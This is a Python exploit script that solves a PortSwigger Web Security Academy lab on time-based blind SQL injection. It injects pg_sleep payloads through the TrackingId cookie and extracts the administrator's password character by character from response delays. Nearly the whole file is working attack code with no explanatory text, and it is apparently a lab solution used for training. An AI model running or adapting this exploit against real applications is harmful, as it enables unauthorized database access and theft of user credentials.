# https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
# Lab: Blind SQL injection with time delays and information retrieval
# Difficulty: Practitioner

import requests
import string
from pwn import log

sub = '0a1800c80331aa9e825ffd1a00f00038'
url = f'https://{sub}.web-security-academy.net/'

wordlist = string.ascii_lowercase + string.digits
password = '' 
password_length = 20 

def exploit():
    global password
    for position in range(1, password_length + 1): 
        for c in wordlist:
            # change the payload to match the lab's TrackingId cookie
            payload = f"HZbSl3cO6ItWQvdq'||(SELECT pg_sleep(10) FROM users WHERE username='administrator' AND SUBSTR(password,{position},1)='{c}')||'"
            r = requests.session()
            
            s = r.get(url, cookies={"TrackingId": payload})
            log.info(f"Elapsed time for character {c} at position {position}: {s.elapsed.total_seconds()}")
            
            if s.elapsed.total_seconds() > 10:  # Check if the response time is more than 10     seconds
                log.success(f"Found character '{c}' at position {position} of the password")
                password += c
                log.info(f"Password so far: {password}")
                break 
            else:   
                log.info(f"Character '{c}' not found at position {position}")
    
if __name__ == '__main__':
    exploit()
